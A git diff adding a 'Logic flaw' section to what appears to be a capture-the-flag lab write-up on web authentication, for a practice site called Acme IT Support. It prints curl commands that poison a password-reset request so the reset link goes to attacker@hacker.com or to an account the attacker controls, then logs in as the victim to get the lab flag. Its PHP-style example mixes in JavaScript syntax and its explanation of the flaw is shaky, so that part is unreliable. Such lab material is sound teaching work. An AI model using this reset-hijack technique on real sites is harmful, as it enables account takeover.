@@ -222,7 +222,7 @@ Using the default credentials, we manage to access the page containing the flag:
 
 ![Acme IT Support framework flag](./img/acme_framework_flag.png "Acme IT Support framework flag")
 
-### OSINT {#osint-content}
+### OSINT (Content)
 
 Freely available tools that collect information can also help in discovering information about the target website.
 
@@ -283,7 +283,7 @@ For example, to use gobuster on the Acme website, we run the command
 
 Subdomain enumeration is the process of finding valid subdomains for a domain, in order to expand the attack surface and discover more points of vulnerability. Here, we explore three methods for subdomain enumeration: brute force, OSINT, and virtual hosts.
 
-### OSINT {#osint-subdomain}
+### OSINT (Subdomains)
 
 **Secure Sockets Layer/Transport Layer Security (SSL/TLS) certificates**
 
@@ -346,4 +346,89 @@ With a list of valid usernames, we can attempt a bruteforce attack on a login pa
 Here, we specified `W1` and `W2` as fuzzing keywords. Thus, for the form data we should set the username and password to be submitted as `W1` and `W2` respectively. To filter for positive matches, the flag `-fc` to check for HTTP status codes other than 200.
 
 ### Logic flaw
+
+Authentication processes can sometimes contain logic flaws -- when the typical control flow of the program is either bypassed, circumvented or manipulated by a malicious actor. Logic flaws can occur in any component of a website, but here we will focus on logic flaws related to authentication processes.
+
+![Intended flow vs. logic flaw](./img/logic_flow.png "Intended flow vs logic flaw")
+
+As a very basic example, consider the code below.
+
+```php
+if (url.substr(0,6) === '/admin') {
+    # check if user is an admin
+} else {
+    # show page
+}
+```
+
+This PHP script checks if the webpage being requested begins with `/admin`, and if so, further checks are made to determine if the user has the required credentials. Otherwise, the webpage is shown directly to the user. The flaw here is the use of the triple equal signs (`===`), which looks for an **exact** match on the string, including letter case. Thus, if a user requests for a page beginning with `/adMin` will not have their privileges checked and have the page shown to them directly, totally bypassing any authentication process.
+
+--- 
+**A more practical example -- Acme IT Support**
+
+Here, we will look at the "Reset Password" page of the Acme IT Support website. Visiting the page, we see a form asking for the email address associated the account on which we wish to perform a password reset. 
+
+![Acme IT Support reset password](./img/acme_reset_pw.png "Acme IT Support reset password")
+
+Using the given email address `robert@acmeitsupport.thm`, we are brought to the next form which asks for the username of the account. 
+
+![Acme IT Support reset password stage 2](./img/acme_reset_pw_2.png "Acme IT Support reset password stage 2")
+
+Using `robert` as the username, we are then presented with a confirmation message that a password reset email will be sent to `robert@acmeitsupport.thm`. 
+
+![Acme IT Support reset password stage 3](./img/acme_reset_pw_3.png "Acme IT Support reset password stage 3")
+
+It turns out that in the password reset process, the username is submitted in a `POST` field, while the email address is sent as a `GET` parameter (query string in URL).
+
+![Acme IT Support reset password request](./img/acme_reset_pw_request.png "Acme IT Support reset password request")
+
+It turns out that in the application, the user account is retrieved via the query string, but the password reset email is sent using the data found in the PHP (superglobal) variable `$_REQUEST` -- an array containing data received from the query string and `POST` data. However, the logic for the `$_REQUEST` variable favours `POST` data fields over query strings, so if we add another parameter to the `POST` form, we can control where the password reset email is sent. We try to do this using `curl`:
+
+```sh
+~$ curl 'http://<WEBSITE_ADDRESS>/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+```
+
+In the response, we see that the email is indeed sent to `attacker@hacker.com`.
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    ...
+</head>
+<body>
+    ...
+    <h1 class="text-center">Acme IT Support</h1>
+    <h2 class="text-center">Reset Password</h2>
+    <div class="row">
+        <div class="col-md-4 col-md-offset-4">
+            <div class="alert alert-success text-center">
+                    <p>We'll send you a reset email to <strong>attacker@hacker.com</strong></p>
+            </div>
+        </div>
+    </div>
+    ...
+</body>
+</html>
+...
+```
+
+To proceed, we create an account on the Acme IT Support website, giving us an unique email address to create support tickets.
+
+![Acme IT Support account](./img/acme_account.png "Acme IT Support account")
+
+Now, we can redirect the password reset email to our account to view its contents. We make the request using `curl`:
+
+```sh
+~$ curl 'http://<WEBSITE_ADDRESS>/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=hacker@customer.acmeitsupport.thm'
+```
+
+![Acme IT Support retrieved ticket](./img/acme_redirect_success.png "Acme IT Support retrieved ticket")
+
+We can open up the ticket we obtained to look at its contents.
+
+![Acme IT Support ticket content](./img/acme_ticket_content.png "Acme IT Support ticket content")
+
+The link allows us to login as `robert`, and we find the flag in the account's support tickets.
+> THM{AUTH_BYPASS_COMPLETE} 
 
